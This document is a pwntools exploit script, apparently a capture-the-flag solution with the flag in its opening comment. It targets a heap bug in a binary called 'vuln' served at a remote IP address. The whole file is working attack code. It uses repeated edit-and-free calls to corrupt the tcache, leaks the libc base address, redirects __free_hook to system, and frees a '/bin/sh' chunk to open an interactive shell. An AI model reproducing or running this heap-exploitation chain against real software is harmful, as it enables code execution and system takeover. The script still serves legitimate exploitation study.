# DO{th3_s3c0nd_h4rd3st_p4rt_0f_m4k1ng_4_ch4llenge_1s_c0ming_up_w1th_4n_1nt3r3st1ng_fl4g...}
from pwn import *

elf = ELF("./vuln")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

target = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
target = remote("193.57.159.27", 26060)

def sla(s, d):
    target.sendlineafter(s, d)

def buy(id=0x6161616161616161):            # 0x30 chunk
    sla(">", "b")
    sla(":", str(id))

def Buy(id=0x4141414141414141):            # 0x80 chunk
    sla(">", "B")
    sla(":", str(id))

def edit(idx, price=0x42424242, name="whoamiT"):
    sla(">", "e")
    sla("?", str(idx))
    sla(":", str(price))
    sla(":", str(name))

def sell(idx):
    sla(">", "s")
    sla("?", str(idx))
    
def view(idx):
    sla(">", "v")
    sla("?", str(idx))

buy()
Buy()
for i in range(8):
    edit(0)
    sell(0)

for i in range(3):
    edit(1)
    sell(1)

view(0)
target.recvuntil("ID: ")
libc_base = int(target.recvline().strip()) - 0x7f6318c2abe0 + 0x00007f6318a3f000
log.info("LIBC Base: " + hex(libc_base))

Buy(libc_base + libc.sym['__free_hook'] - 8)
Buy()
Buy(u64("/bin/sh\x00"))
edit(4, 0xffffffff & (libc_base + libc.sym['system']), p64(libc_base + libc.sym['system'])[4:])

sell(4)

target.interactive()